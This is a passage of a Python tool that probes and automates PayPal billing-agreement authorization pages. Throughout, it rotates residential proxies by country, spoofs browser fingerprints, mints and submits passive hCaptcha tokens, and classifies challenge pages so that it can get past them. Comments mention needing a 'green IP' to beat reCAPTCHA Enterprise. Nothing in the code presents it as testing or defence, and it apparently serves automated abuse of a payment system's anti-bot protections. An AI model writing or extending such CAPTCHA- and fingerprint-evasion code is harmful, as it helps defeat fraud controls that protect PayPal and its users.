            "HTTP-FP submit OK token_len=%d via %s",
            result["token_len"],
            (sub.get("plan") or {}).get("primary_url"),
        )
    return result


def solve_authchallenge_http_fp(
    session: Any,
    challenge_html: str,
    *,
    page_url: str,
    proxy: Optional[str] = None,
    ec_token: str = "",
    timeout: int = 90,
    user_agent: str = "",
    browser_profile: Optional[dict] = None,
    screen: Optional[dict] = None,
    viewport: Optional[dict] = None,
    accept_language: str = "",
) -> dict[str, Any]:
    """Public entry used by ba_authorize._handle_authchallenge (no farm, no browser)."""
    if not http_fp_enabled():
        return {"ok": False, "error": "MIN_BA_HTTP_FP disabled"}
    if is_hcaptcha_passive_challenge(challenge_html):
        return validate_hcaptcha_passive(
            session,
            challenge_html=challenge_html,
            page_url=page_url,
            proxy=proxy,
            timeout=timeout,
            ec_token=ec_token,
            user_agent=user_agent,
            browser_profile=browser_profile,
            screen=screen,
            viewport=viewport,
            accept_language=accept_language,
        )
    return {
        "ok": False,
        "error": "not_hcaptcha_passive_use_other_path",
        "hint": "reCAPTCHA Enterprise still needs green IP or alternate path",
    }


# ── Read-only probe (sample BA liveness + gate classification) ──────────── #


def _make_proxy(region: str, session_tag: str) -> str:
    try:
        import proxy_711 as p711

        if hasattr(p711, "build_711_proxy"):
            return p711.build_711_proxy(region=region, session=session_tag, sess_time=40)
        return p711.build_residential_proxy(region=region, session=session_tag, sess_time=40)
    except Exception:
        from proxy_711 import build_residential_proxy

        return build_residential_proxy(region=region, session=session_tag, sess_time=40)


def probe_ba_readonly(
    ba_url: str,
    *,
    region: str = "MX",
    session_tag: str = "httpfp",
    do_ddbm2: bool = True,
    try_hcaptcha: bool = False,
    proxy: Optional[str] = None,
) -> dict[str, Any]:
    """GET BA URL only (+ optional ddbm2 / entry validatecaptcha). Never SMS/consent."""
    from ba_authorize import BAAuthorizer

    os.environ.setdefault("MIN_BA_SKIP_ENTRY_CAPTCHA", "1")  # we control captcha ourselves
    proxy = proxy or _make_proxy(region, session_tag)
    auth = BAAuthorizer(proxy=proxy, fp_country=region)

    row: dict[str, Any] = {
        "ba_url": ba_url[:120],
        "region": region,
        "proxy_tail": (proxy or "")[-40:],
        "ddbm2": None,
        "init": None,
        "hcaptcha": None,
    }

    m = re.search(r"ba_token=([A-Za-z0-9-]+)", ba_url)
    ba_token = m.group(1) if m else ""

    if do_ddbm2:
        row["ddbm2"] = ddbm2_warmup(
            auth.session,
            page_url=ba_url,
            ba_token=ba_token,
            timeout=20,
        )

    init = auth.init_session(ba_url)
    row["init"] = {
        "page_kind": init.get("page_kind"),
        "status_code": init.get("status_code"),
        "html_len": init.get("html_len"),
        "final_url": (init.get("final_url") or "")[:160],
        "ec_token": bool(init.get("ec_token")),
        "ec_source": init.get("ec_source"),
        "dead": bool(init.get("dead")),
        "diag_ec_on_error_url": bool(init.get("diag_ec_on_error_url")),
    }

    # Optional: if we landed on authchallenge HTML, try pure protocol solve (no SMS)
    if try_hcaptcha and init.get("page_kind") == "authchallenge" and not init.get("dead"):
        # Re-fetch raw HTML from last response — init_session already classified;
        # re-GET to hold challenge HTML for form fields.
        try:
            r = auth.session.get(ba_url, allow_redirects=True, timeout=30)
            html = r.text or ""
            if is_hcaptcha_passive_challenge(html):
                row["hcaptcha"] = validate_hcaptcha_passive(
                    auth.session,
                    challenge_html=html,
                    page_url=str(r.url),
                    proxy=proxy,
                    timeout=50,
                    ec_token=init.get("ec_token") or "",
                )
                # re-init after validate
                init2 = auth.init_session(ba_url)
                row["init_after_captcha"] = {
                    "page_kind": init2.get("page_kind"),
                    "ec_token": bool(init2.get("ec_token")),
                    "dead": bool(init2.get("dead")),
                    "final_url": (init2.get("final_url") or "")[:160],
                }
            else:
                row["hcaptcha"] = {
                    "ok": False,
                    "error": "challenge_not_passive_hcaptcha",
                    "page_kind": BAAuthorizer._classify_ba_page(html, str(r.url)),
                }
        except Exception as e:
            row["hcaptcha"] = {"ok": False, "error": f"{type(e).__name__}:{e}"}

    return row


def unit_selfcheck() -> dict[str, Any]:
    """No-network unit checks for form builders / classification helpers."""
    # synthetic challenge HTML shaped like PayPal authchallenge passive
    html = """
    <html data-app="authchallenge" data-captcha-type="hcaptchapassive"
          data-csrf="CSRFTOKEN123" data-sessionid="SESSID456"
          data-jse="JSEVALUE789">
      <input name="_csrf" value="CSRFTOKEN123"/>
      <input name="_requestId" value="REQID999"/>
      <input name="_hash" value="HASHABC"/>
      <input name="_sessionID" value="SESSID456"/>
      <iframe src="https://www.paypalobjects.com/web/res/141/8f47389605e94227ab2caad0d53b9/hcaptcha/hcaptchapassive_eval.html?siteKey=884d15d9-b649-4bbb-8d1c-2d6f0eed75eb"></iframe>
    </html>
    """
    iframe = extract_hcaptcha_passive_iframe_src(html)
    sk = extract_hcaptcha_site_key(html, iframe)
    form = build_hcaptcha_validate_form(html, "P1_FAKE_TOKEN_FOR_UNIT_TEST")
    complete, missing = form_fields_complete(form)
    return {
        "helpers_exist": {
            "ddbm2": DDBM2_JS.exists(),
            "hcaptcha": HCAPTCHA_JS.exists(),
        },
        "node": _node_bin(),
        "node_path_has_happy": "happy-dom" in _happy_dom_node_path()
        or any(
            (Path(p) / "happy-dom").exists()
            for p in _happy_dom_node_path().split(os.pathsep)
            if p
        ),
        "is_passive": is_hcaptcha_passive_challenge(html),
        "iframe_ok": "hcaptchapassive" in iframe,
        "sitekey": sk,
        "form_complete": complete,
        "form_missing": missing,
        "form_keys": sorted(form.keys()),
        "http_fp_enabled": http_fp_enabled(),
    }


def main() -> int:
    import argparse

    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s %(levelname)s %(name)s: %(message)s",
    )
    ap = argparse.ArgumentParser(description="Pure HTTP FP BA probe (no charge)")
    ap.add_argument("--unit", action="store_true", help="local unit selfcheck only")
    ap.add_argument(
        "--samples",
        action="store_true",
        help="probe the 3 user-given sample BAs (read-only GET + ddbm2)",
    )
    ap.add_argument("--region", default="MX", help="proxy region MX/BR/US")
    ap.add_argument(
        "--try-hcaptcha",
        action="store_true",
        help="if authchallenge, try passive mint+validate (still no SMS/consent)",
    )
    ap.add_argument("--ba-url", default="", help="single BA URL")
    args = ap.parse_args()

    if args.unit or (not args.samples and not args.ba_url):
        u = unit_selfcheck()
        print(json.dumps(u, ensure_ascii=False, indent=2))
        if not args.samples and not args.ba_url:
            return 0 if u.get("form_complete") and u["helpers_exist"]["ddbm2"] else 1

    rows = []
    urls: list[tuple[str, str]] = []
    if args.ba_url:
        urls.append(("cli", args.ba_url))
    if args.samples:
        # Read URLs from samples/success.jsonl — GET only, never authorize
        targets = {
            "BA-XXXXXXXXXXXXXXX1",
            "BA-XXXXXXXXXXXXXXX2",
            "BA-XXXXXXXXXXXXXXX3",
        }
        path = ROOT / "samples" / "success.jsonl"
        with open(path, "r", encoding="utf-8") as f:
            for line in f:
                if not line.strip():
                    continue
                o = json.loads(line)
                url = o.get("paypal_approve_url") or ""
                if not url:
                    continue
                ba = url.split("ba_token=")[-1].split("&")[0]
                if ba in targets:
                    urls.append((ba, url))

    for label, url in urls:
        print(f"\n=== probe {label} region={args.region} ===")
        try:
            row = probe_ba_readonly(
                url,
                region=args.region,
                session_tag=f"httpfp_{label[-6:]}",
                do_ddbm2=True,
                try_hcaptcha=bool(args.try_hcaptcha),
            )
        except Exception as e:
            row = {"label": label, "error": f"{type(e).__name__}:{e}"}
        row["label"] = label
        rows.append(row)
        print(json.dumps(row, ensure_ascii=False, indent=2, default=str))

    out_path = ROOT / "_ba_authorize_http_fp_probe_out.json"
    out_path.write_text(json.dumps(rows, ensure_ascii=False, indent=2, default=str), encoding="utf-8")
    print(f"\nWrote {out_path}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
